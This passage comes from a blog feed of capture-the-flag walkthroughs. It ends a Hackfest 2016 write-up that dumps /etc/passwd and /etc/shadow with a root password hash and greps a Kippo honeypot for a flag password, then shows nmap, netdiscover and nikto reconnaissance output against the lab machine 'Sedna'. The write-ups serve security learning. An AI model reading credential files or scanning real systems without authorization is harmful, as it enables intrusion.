messagebus:x:103:107::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false
bind:x:104:114::&#x2F;var&#x2F;cache&#x2F;bind:&#x2F;bin&#x2F;false
postfix:x:105:115::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;bin&#x2F;false
dovecot:x:106:117:Dovecot mail server,,,:&#x2F;usr&#x2F;lib&#x2F;dovecot:&#x2F;bin&#x2F;false
dovenull:x:107:118:Dovecot login user,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
landscape:x:108:119::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false
sshd:x:109:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin
postgres:x:110:120:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash
avahi:x:111:121:Avahi mDNS daemon,,,:&#x2F;var&#x2F;run&#x2F;avahi-daemon:&#x2F;bin&#x2F;false
colord:x:112:123:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;bin&#x2F;false
kippo:x:1001:27::&#x2F;home&#x2F;kippo:&#x2F;bin&#x2F;bash
statd:x:113:65534::&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;bin&#x2F;false
systemd-timesync:x:114:125:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
systemd-network:x:115:126:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false
systemd-resolve:x:116:127:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false
systemd-bus-proxy:x:117:128:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
uuidd:x:100:101::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false
lxd:x:118:65534::&#x2F;var&#x2F;lib&#x2F;lxd&#x2F;:&#x2F;bin&#x2F;false
_apt:x:119:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false
dnsmasq:x:120:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false

cat &#x2F;etc&#x2F;shadow
root:$6$psudnBp7$lVI5Y6RtuMfKSpyeno0Kw0fJWv9oylnnc7GVeqTanD88zXT5NvjveIyi.rCef4FDXlpbuDMBvFUhraOTAhw3e.:17097:0:99999:7:::
daemon:*:16273:0:99999:7:::
bin:*:16273:0:99999:7:::
sys:*:16273:0:99999:7:::
sync:*:16273:0:99999:7:::
games:*:16273:0:99999:7:::
man:*:16273:0:99999:7:::
lp:*:16273:0:99999:7:::
mail:*:16273:0:99999:7:::
news:*:16273:0:99999:7:::
uucp:*:16273:0:99999:7:::
proxy:*:16273:0:99999:7:::
www-data:*:16273:0:99999:7:::
backup:*:16273:0:99999:7:::
list:*:16273:0:99999:7:::
irc:*:16273:0:99999:7:::
gnats:*:16273:0:99999:7:::
nobody:*:16273:0:99999:7:::
syslog:*:16273:0:99999:7:::
mysql:!:17083:0:99999:7:::
messagebus:*:17083:0:99999:7:::
bind:*:17083:0:99999:7:::
postfix:*:17083:0:99999:7:::
dovecot:*:17083:0:99999:7:::
dovenull:*:17083:0:99999:7:::
landscape:*:17083:0:99999:7:::
sshd:*:17083:0:99999:7:::
postgres:*:17083:0:99999:7:::
avahi:*:17083:0:99999:7:::
colord:*:17083:0:99999:7:::
kippo:!:17086:0:99999:7:::
statd:*:17088:0:99999:7:::
systemd-timesync:*:17102:0:99999:7:::
systemd-network:*:17102:0:99999:7:::
systemd-resolve:*:17102:0:99999:7:::
systemd-bus-proxy:*:17102:0:99999:7:::
uuidd:!:16273:0:99999:7:::
lxd:*:17102:0:99999:7:::
_apt:*:17102:0:99999:7:::
dnsmasq:*:17102:0:99999:7:::
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Upon initial inspection of these files I didn&#x27;t see anything that jumped out at me.  Then after a lot more enumeration I broke down and wanted to see how a more experienced tester was able to progress farther.  The user kippo is one that a known honeypot might run as.  Upon running:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;whereis kippo
&#x2F;etc&#x2F;kippo
cd &#x2F;etc&#x2F;kippo
ls
README.md
data
dl
doc
fs.pickle
honeyfs
kippo
kippo.cfg
kippo.tac
log
start.sh
stop.sh
txtcmds
utils


grep -ir &#x27;ssw&#x27;  *
README.md:* Possibility of adding fake file contents so the attacker can &#x27;cat&#x27; files such as &#x2F;etc&#x2F;passwd. Only minimal file contents are included
data&#x2F;userdb.txt:fakuser:1:TH!SP4SSW0RDIS4Fl4G!
doc&#x2F;sql&#x2F;mysql.sql:  `password` varchar(100) NOT NULL,
fs.pickle:S&#x27;update-passwd&#x27;
fs.pickle:S&#x27;chgpasswd&#x27;
fs.pickle:S&#x27;chpasswd&#x27;
fs.pickle:S&#x27;gpasswd&#x27;
fs.pickle:S&#x27;passwd&#x27;
fs.pickle:S&#x27;grub-mkpasswd-pbkdf2&#x27;
fs.pickle:S&#x27;nsswitch.conf&#x27;
fs.pickle:S&#x27;base-passwd&#x27;
fs.pickle:S&#x27;passwd&#x27;
fs.pickle:S&#x27;passwd.expire.cron&#x27;
fs.pickle:S&#x27;passwd.1.gz&#x27;
fs.pickle:S&#x27;gpasswd.1.gz&#x27;
fs.pickle:S&#x27;chpasswd.8.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;update-passwd.8.gz&#x27;
fs.pickle:S&#x27;passwd.1.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;passwd.1.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;grub-mkpasswd-pbkdf2.1.gz&#x27;
fs.pickle:S&#x27;passwd.1.gz&#x27;
fs.pickle:S&#x27;gpasswd.1.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;passwd.1.gz&#x27;
fs.pickle:S&#x27;gpasswd.1.gz&#x27;
fs.pickle:S&#x27;chpasswd.8.gz&#x27;
fs.pickle:S&#x27;update-passwd.8.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;passwd.1.gz&#x27;
fs.pickle:S&#x27;gpasswd.1.gz&#x27;
fs.pickle:S&#x27;chpasswd.8.gz&#x27;
fs.pickle:S&#x27;update-passwd.8.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;update-passwd.8.gz&#x27;
fs.pickle:S&#x27;passwd.1.gz&#x27;
fs.pickle:S&#x27;gpasswd.1.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;chpasswd.8.gz&#x27;
fs.pickle:S&#x27;chgpasswd.8.gz&#x27;
fs.pickle:S&#x27;update-passwd.8.gz&#x27;
fs.pickle:S&#x27;gpasswd.1.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;passwd2des.3.gz&#x27;
fs.pickle:S&#x27;chpasswd.8.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;gpasswd.1.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;passwd.1.gz&#x27;
fs.pickle:S&#x27;gpasswd.1.gz&#x27;
fs.pickle:S&#x27;chpasswd.8.gz&#x27;
fs.pickle:S&#x27;update-passwd.8.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;passwd.1.gz&#x27;
fs.pickle:S&#x27;gpasswd.1.gz&#x27;
fs.pickle:S&#x27;chpasswd.8.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;nsswitch.conf.5.gz&#x27;
fs.pickle:S&#x27;passwd.1.gz&#x27;
fs.pickle:S&#x27;gpasswd.1.gz&#x27;
fs.pickle:S&#x27;chpasswd.8.gz&#x27;
fs.pickle:S&#x27;update-passwd.8.gz&#x27;
fs.pickle:S&#x27;passwd.5.gz&#x27;
fs.pickle:S&#x27;common-password&#x27;
fs.pickle:S&#x27;common-password.md5sums&#x27;
fs.pickle:S&#x27;base-passwd&#x27;
fs.pickle:S&#x27;passwd.master&#x27;
fs.pickle:S&#x27;passwd&#x27;
fs.pickle:S&#x27;nsswitch.conf&#x27;
fs.pickle:S&#x27;Password.pm&#x27;
fs.pickle:S&#x27;Password.pm&#x27;
fs.pickle:S&#x27;Password.pm&#x27;
fs.pickle:S&#x27;Password.pm&#x27;
fs.pickle:S&#x27;Password.pm&#x27;
fs.pickle:S&#x27;Password.pm&#x27;
fs.pickle:S&#x27;Password.pm&#x27;
fs.pickle:S&#x27;yppasswd.x&#x27;
fs.pickle:S&#x27;yppasswd.h&#x27;
fs.pickle:S&#x27;password.mod&#x27;
fs.pickle:S&#x27;password_pbkdf2.mod&#x27;
fs.pickle:S&#x27;password&#x27;
fs.pickle:S&#x27;passwd.conffiles&#x27;
fs.pickle:S&#x27;passwd.md5sums&#x27;
fs.pickle:S&#x27;passwd.preinst&#x27;
fs.pickle:S&#x27;base-passwd.list&#x27;
fs.pickle:S&#x27;base-passwd.md5sums&#x27;
fs.pickle:S&#x27;base-passwd.postinst&#x27;
fs.pickle:S&#x27;passwd.postinst&#x27;
fs.pickle:S&#x27;passwd.list&#x27;
fs.pickle:S&#x27;passwords.dat&#x27;
fs.pickle:S&#x27;passwd&#x27;
fs.pickle:S&#x27;passwd&#x27;
fs.pickle:S&#x27;common-password&#x27;
fs.pickle:S&#x27;chpasswd&#x27;
fs.pickle:S&#x27;nsswitch.conf&#x27;
fs.pickle:S&#x27;passwd&#x27;
fs.pickle:S&#x27;opasswd&#x27;
fs.pickle:S&#x27;passwd-&#x27;
fs.pickle:S&#x27;password.mod&#x27;
fs.pickle:S&#x27;password_pbkdf2.mod&#x27;
kippo&#x2F;commands&#x2F;adduser.py:            (O_P, &#x27;Password: &#x27;),
kippo&#x2F;commands&#x2F;adduser.py:            (O_P, &#x27;Password again: &#x27;),
kippo&#x2F;commands&#x2F;adduser.py:            self.honeypot.password_input = True
kippo&#x2F;commands&#x2F;adduser.py:        self.honeypot.password_input = False
kippo&#x2F;commands&#x2F;base.py:class command_passwd(HoneyPotCommand):
kippo&#x2F;commands&#x2F;base.py:        self.write(&#x27;Enter new UNIX password: &#x27;)
kippo&#x2F;commands&#x2F;base.py:        self.honeypot.password_input = True
kippo&#x2F;commands&#x2F;base.py:        self.passwd = None
kippo&#x2F;commands&#x2F;base.py:        self.passwd = line
kippo&#x2F;commands&#x2F;base.py:        self.write(&#x27;Retype new UNIX password: &#x27;)
kippo&#x2F;commands&#x2F;base.py:        self.honeypot.password_input = False
kippo&#x2F;commands&#x2F;base.py:        if line != self.passwd or self.passwd == &#x27;*&#x27;:
kippo&#x2F;commands&#x2F;base.py:            self.writeln(&#x27;Sorry, passwords do not match&#x27;)
kippo&#x2F;commands&#x2F;base.py:            self.honeypot.user.uid, self.passwd)
kippo&#x2F;commands&#x2F;base.py:        self.writeln(&#x27;passwd: password updated successfully&#x27;)
kippo&#x2F;commands&#x2F;base.py:        print &#x27;INPUT (passwd):&#x27;, line
kippo&#x2F;commands&#x2F;base.py:        self.password = line.strip()
kippo&#x2F;commands&#x2F;base.py:commands[&#x27;&#x2F;usr&#x2F;bin&#x2F;passwd&#x27;] = command_passwd
kippo&#x2F;commands&#x2F;ssh.py:        self.write(&#x27;%s@%s\&#x27;s password: &#x27; % (self.user, self.host))
kippo&#x2F;commands&#x2F;ssh.py:        self.honeypot.password_input = True
kippo&#x2F;commands&#x2F;ssh.py:        self.honeypot.password_input = False
kippo&#x2F;dblog&#x2F;textlog.py:            (args[&#x27;username&#x27;], args[&#x27;password&#x27;]))
kippo&#x2F;dblog&#x2F;textlog.py:            (args[&#x27;username&#x27;], args[&#x27;password&#x27;]))
kippo&#x2F;dblog&#x2F;mysql.py:            passwd = cfg.get(&#x27;database_mysql&#x27;, &#x27;password&#x27;),
kippo&#x2F;dblog&#x2F;mysql.py:            &#x27;, `username`, `password`, `timestamp`)&#x27; + \
kippo&#x2F;dblog&#x2F;mysql.py:            (session, 0, args[&#x27;username&#x27;], args[&#x27;password&#x27;], self.nowUnix()))
kippo&#x2F;dblog&#x2F;mysql.py:            &#x27;, `username`, `password`, `timestamp`)&#x27; + \
kippo&#x2F;dblog&#x2F;mysql.py:            (session, 1, args[&#x27;username&#x27;], args[&#x27;password&#x27;], self.nowUnix()))
kippo&#x2F;dblog&#x2F;xmpp.py:        password    = cfg.get(&#x27;database_xmpp&#x27;, &#x27;password&#x27;)
kippo&#x2F;dblog&#x2F;xmpp.py:        self.run(application, jid, password, muc, channels)
kippo&#x2F;dblog&#x2F;xmpp.py:    def run(self, application, jidstr, password, muc, channels, anon=True):
kippo&#x2F;dblog&#x2F;xmpp.py:        self.xmppclient = XMPPClient(jid.internJID(jidstr), password)
kippo&#x2F;dblog&#x2F;xmpp.py:        ses[&#x27;password&#x27;] = args[&#x27;password&#x27;]
kippo&#x2F;dblog&#x2F;xmpp.py:        ses[&#x27;password&#x27;] = args[&#x27;password&#x27;]
kippo&#x2F;core&#x2F;auth.py:            (login, uid_str, passwd) = line.split(&#x27;:&#x27;, 2)
kippo&#x2F;core&#x2F;auth.py:            self.userdb.append((login, uid, passwd))
kippo&#x2F;core&#x2F;auth.py:        for (login, uid, passwd) in self.userdb:
kippo&#x2F;core&#x2F;auth.py:            f.write(&#x27;%s:%d:%s\n&#x27; % (login, uid, passwd))
kippo&#x2F;core&#x2F;auth.py:    def checklogin(self, thelogin, thepasswd):
kippo&#x2F;core&#x2F;auth.py:        &#x27;&#x27;&#x27;check entered username&#x2F;password against database&#x27;&#x27;&#x27;
kippo&#x2F;core&#x2F;auth.py:        &#x27;&#x27;&#x27;note that it allows multiple passwords for a single username&#x27;&#x27;&#x27;
kippo&#x2F;core&#x2F;auth.py:        for (login, uid, passwd) in self.userdb:
kippo&#x2F;core&#x2F;auth.py:            if login == thelogin and passwd in (thepasswd, &#x27;*&#x27;):
kippo&#x2F;core&#x2F;auth.py:        for (login, uid, passwd) in self.userdb:
kippo&#x2F;core&#x2F;auth.py:    def user_password_exists(self, thelogin, thepasswd):
kippo&#x2F;core&#x2F;auth.py:        for (login, uid, passwd) in self.userdb:
kippo&#x2F;core&#x2F;auth.py:            if login == thelogin and passwd == thepasswd:
kippo&#x2F;core&#x2F;auth.py:        for (login, uid, passwd) in self.userdb:
kippo&#x2F;core&#x2F;auth.py:        for (login, uid, passwd) in self.userdb:
kippo&#x2F;core&#x2F;auth.py:    def adduser(self, login, uid, passwd):
kippo&#x2F;core&#x2F;auth.py:        if self.user_password_exists(login, passwd):
kippo&#x2F;core&#x2F;auth.py:        self.userdb.append((login, uid, passwd))
kippo&#x2F;core&#x2F;auth.py:class HoneypotPasswordChecker:
kippo&#x2F;core&#x2F;auth.py:    credentialInterfaces = (credentials.IUsernamePassword,
kippo&#x2F;core&#x2F;auth.py:        if hasattr(credentials, &#x27;password&#x27;):
kippo&#x2F;core&#x2F;auth.py:            if self.checkUserPass(credentials.username, credentials.password):
kippo&#x2F;core&#x2F;auth.py:        r = pamConversion(((&#x27;Password:&#x27;, 1),))
kippo&#x2F;core&#x2F;auth.py:    def checkUserPass(self, username, password):
kippo&#x2F;core&#x2F;auth.py:        if UserDB().checklogin(username, password):
kippo&#x2F;core&#x2F;auth.py:            print &#x27;login attempt [%s&#x2F;%s] succeeded&#x27; % (username, password)
kippo&#x2F;core&#x2F;auth.py:            print &#x27;login attempt [%s&#x2F;%s] failed&#x27; % (username, password)
kippo&#x2F;core&#x2F;dblog.py:            (&#x27;^login attempt \[(?P&lt;username&gt;.*)&#x2F;(?P&lt;password&gt;.*)\] failed&#x27;,
kippo&#x2F;core&#x2F;dblog.py:            (&#x27;^login attempt \[(?P&lt;username&gt;.*)&#x2F;(?P&lt;password&gt;.*)\] succeeded&#x27;,
kippo&#x2F;core&#x2F;dblog.py:    # args has: username, password
kippo&#x2F;core&#x2F;dblog.py:    # args has: username, password
kippo&#x2F;core&#x2F;protocol.py:        self.password_input = False
kippo&#x2F;core&#x2F;protocol.py:    # Easier way to implement password input?
kippo&#x2F;core&#x2F;protocol.py:        if not self.password_input:
Binary file kippo&#x2F;core&#x2F;auth.pyc matches
kippo.cfg:# user:1:TH!SP4SSW0RDIS4Fl4G!
kippo.cfg:# Directory for miscellaneous data files, such as the password database.
kippo.cfg:#password = secret
kippo.cfg:#password = anonymous
kippo.tac:factory.portal.registerChecker(core.auth.HoneypotPasswordChecker())
txtcmds&#x2F;usr&#x2F;sbin&#x2F;vipw:vipw: &#x2F;etc&#x2F;passwd is unchanged
utils&#x2F;passdb.py:        print &#x27;Usage: %s &lt;pass.db&gt; &lt;add|remove|list&gt; [password]&#x27; % \
utils&#x2F;passdb.py:        for password in db.keys():
utils&#x2F;passdb.py:            print password
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The second line returned: data&#x2F;userdb.txt:fakuser:1:TH!SP4SSW0RDIS4Fl4G!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;flag-4&quot;&gt;Flag 4&lt;&#x2F;h2&gt;
&lt;p&gt;I wasn&#x27;t able to find the post-exploitation flag, looks like most didn&#x27;t, moving on to another.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>hackfest2016-Sedna</title>
		<published>2017-06-29T00:00:00+00:00</published>
		<updated>2017-06-29T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/hackfest-2016-sedna/" type="text/html"/>
		<id>https://m4l1c3.github.io/hackfest-2016-sedna/</id>
		<content type="html">&lt;h1 id=&quot;sedna&quot;&gt;Sedna&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -T4 -A -sC -v -P 0-65535 10.37.129.7 -oA sedna-output
Warning: The -P0 option is deprecated. Please use -Pn

Starting Nmap 7.40 ( https:&#x2F;&#x2F;nmap.org ) at 2017-06-23 08:38 UTC
NSE: Loaded 143 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:38
Completed NSE at 08:38, 0.00s elapsed
Initiating NSE at 08:38
Completed NSE at 08:38, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:38
Completed Parallel DNS resolution of 1 host. at 08:38, 0.12s elapsed
Initiating SYN Stealth Scan at 08:38
Scanning 10.37.129.7 [1000 ports]
Discovered open port 53&#x2F;tcp on 10.37.129.7
Discovered open port 143&#x2F;tcp on 10.37.129.7
Discovered open port 22&#x2F;tcp on 10.37.129.7
Discovered open port 111&#x2F;tcp on 10.37.129.7
Discovered open port 8080&#x2F;tcp on 10.37.129.7
Discovered open port 445&#x2F;tcp on 10.37.129.7
Discovered open port 110&#x2F;tcp on 10.37.129.7
Discovered open port 993&#x2F;tcp on 10.37.129.7
Discovered open port 80&#x2F;tcp on 10.37.129.7
Discovered open port 995&#x2F;tcp on 10.37.129.7
Discovered open port 139&#x2F;tcp on 10.37.129.7
Completed SYN Stealth Scan at 08:38, 0.25s elapsed (1000 total ports)
Initiating Service scan at 08:38
Scanning 11 services on 10.37.129.7
Completed Service scan at 08:38, 12.07s elapsed (11 services on 1 host)
Initiating OS detection (try #1) against 10.37.129.7
Retrying OS detection (try #2) against 10.37.129.7
Initiating Traceroute at 08:38
Completed Traceroute at 08:38, 0.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 08:38
Completed Parallel DNS resolution of 2 hosts. at 08:38, 4.13s elapsed
NSE: Script scanning 10.37.129.7.
Initiating NSE at 08:38
Completed NSE at 08:38, 10.59s elapsed
Initiating NSE at 08:38
Completed NSE at 08:38, 0.01s elapsed
Nmap scan report for 10.37.129.7
Host is up (0.00087s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE     VERSION
22&#x2F;tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
|_  256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
53&#x2F;tcp   open  domain      ISC BIND 9.9.5-3-Ubuntu
| dns-nsid:
|_  bind.version: 9.9.5-3-Ubuntu
80&#x2F;tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)
|_http-title: Site doesn&#x27;t have a title (text&#x2F;html).
110&#x2F;tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL RESP-CODES AUTH-RESP-CODE STLS TOP UIDL CAPA PIPELINING
| ssl-cert: Subject: commonName=localhost&#x2F;organizationName=Dovecot mail server
| Issuer: commonName=localhost&#x2F;organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2016-10-07T19:17:14
| Not valid after:  2026-10-07T19:17:14
| MD5:   a32c 1b8e 97f3 210f d238 ba3d ac45 74f7
|_SHA-1: 0b7b 4229 b7af 8f89 d533 2ecf 5a1f f652 a015 0295
|_ssl-date: TLS randomness does not represent time
111&#x2F;tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port&#x2F;proto  service
|   100000  2,3,4        111&#x2F;tcp  rpcbind
|   100000  2,3,4        111&#x2F;udp  rpcbind
|   100024  1          43581&#x2F;udp  status
|_  100024  1          49481&#x2F;tcp  status
139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143&#x2F;tcp  open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGIN-REFERRALS ENABLE more SASL-IR have STARTTLS post-login listed LITERAL+ IDLE ID Pre-login capabilities OK LOGINDISABLEDA0001 IMAP4rev1
| ssl-cert: Subject: commonName=localhost&#x2F;organizationName=Dovecot mail server
| Issuer: commonName=localhost&#x2F;organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2016-10-07T19:17:14
| Not valid after:  2026-10-07T19:17:14
| MD5:   a32c 1b8e 97f3 210f d238 ba3d ac45 74f7
|_SHA-1: 0b7b 4229 b7af 8f89 d533 2ecf 5a1f f652 a015 0295
|_ssl-date: TLS randomness does not represent time
445&#x2F;tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
993&#x2F;tcp  open  ssl&#x2F;imap    Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGIN-REFERRALS ENABLE SASL-IR more have post-login listed LITERAL+ IDLE ID Pre-login capabilities OK IMAP4rev1 AUTH=PLAINA0001
| ssl-cert: Subject: commonName=localhost&#x2F;organizationName=Dovecot mail server
| Issuer: commonName=localhost&#x2F;organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2016-10-07T19:17:14
| Not valid after:  2026-10-07T19:17:14
| MD5:   a32c 1b8e 97f3 210f d238 ba3d ac45 74f7
|_SHA-1: 0b7b 4229 b7af 8f89 d533 2ecf 5a1f f652 a015 0295
|_ssl-date: TLS randomness does not represent time
995&#x2F;tcp  open  ssl&#x2F;pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) RESP-CODES AUTH-RESP-CODE USER TOP UIDL CAPA PIPELINING
| ssl-cert: Subject: commonName=localhost&#x2F;organizationName=Dovecot mail server
| Issuer: commonName=localhost&#x2F;organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2016-10-07T19:17:14
| Not valid after:  2026-10-07T19:17:14
| MD5:   a32c 1b8e 97f3 210f d238 ba3d ac45 74f7
|_SHA-1: 0b7b 4229 b7af 8f89 d533 2ecf 5a1f f652 a015 0295
|_ssl-date: TLS randomness does not represent time
8080&#x2F;tcp open  http        Apache Tomcat&#x2F;Coyote JSP engine 1.1
| http-methods:
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote&#x2F;1.1
|_http-title: Apache Tomcat
Device type: general purpose
Running (JUST GUESSING): Apple Mac OS X 10.7.X (85%), FreeBSD 8.X (85%)
OS CPE: cpe:&#x2F;o:apple:mac_os_x:10.7.4 cpe:&#x2F;o:freebsd:freebsd:8.0
Aggressive OS guesses: Apple Mac OS X 10.7.4 (Lion) (Darwin 11.4.0) (85%), FreeBSD 8.0-CURRENT (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=126 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: Host: SEDNA; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 6d18h27m05s, deviation: 0s, median: 6d18h27m05s
| nbstat: NetBIOS name: SEDNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   SEDNA&lt;00&gt;            Flags: &lt;unique&gt;&lt;active&gt;
|   SEDNA&lt;03&gt;            Flags: &lt;unique&gt;&lt;active&gt;
|   SEDNA&lt;20&gt;            Flags: &lt;unique&gt;&lt;active&gt;
|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery:
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   NetBIOS computer name: SEDNA\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2017-06-29T23:05:51-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE (using port 199&#x2F;tcp)
HOP RTT     ADDRESS
1   0.05 ms 172.17.0.1
2   1.00 ms 10.37.129.7

NSE: Script Post-scanning.
Initiating NSE at 08:38
Completed NSE at 08:38, 0.00s elapsed
Initiating NSE at 08:38
Completed NSE at 08:38, 0.00s elapsed
Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap
OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
Nmap done: 1 IP address (1 host up) scanned in 31.87 seconds
Raw packets sent: 1066 (50.324KB) | Rcvd: 1034 (42.032KB)

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sudo netdiscover -r 10.37.129.0&#x2F;24
Currently scanning: Finished!   |   Screen View: Unique Hosts

6 Captured ARP Req&#x2F;Rep packets, from 3 hosts.   Total size: 288
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname
-----------------------------------------------------------------------------
10.37.129.1     00:1c:42:00:00:19      3     126  Parallels, Inc.
10.37.129.2     00:1c:42:00:00:09      1      42  Parallels, Inc.
10.37.129.7     00:1c:42:3f:0f:0c      2     120  Parallels, Inc.
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nikto -h 10.37.129.7
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.37.129.7
+ Target Hostname:    10.37.129.7
+ Target Port:        80
+ Start Time:         2017-07-07 22:03:23 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache&#x2F;2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file &#x2F;, fields: 0x65 0x53fb059bb5bc8
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)
+ &quot;robots.txt&quot; contains 1 entry which should be manually viewed.
+ Apache&#x2F;2.4.7 appears to be outdated (current is at least Apache&#x2F;2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+ OSVDB-3268: &#x2F;files&#x2F;: Directory indexing found.
+ OSVDB-3092: &#x2F;files&#x2F;: This might be interesting...
+ OSVDB-3092: &#x2F;system&#x2F;: This might be interesting...
+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.
+ OSVDB-3092: &#x2F;license.txt: License file found may identify site software.
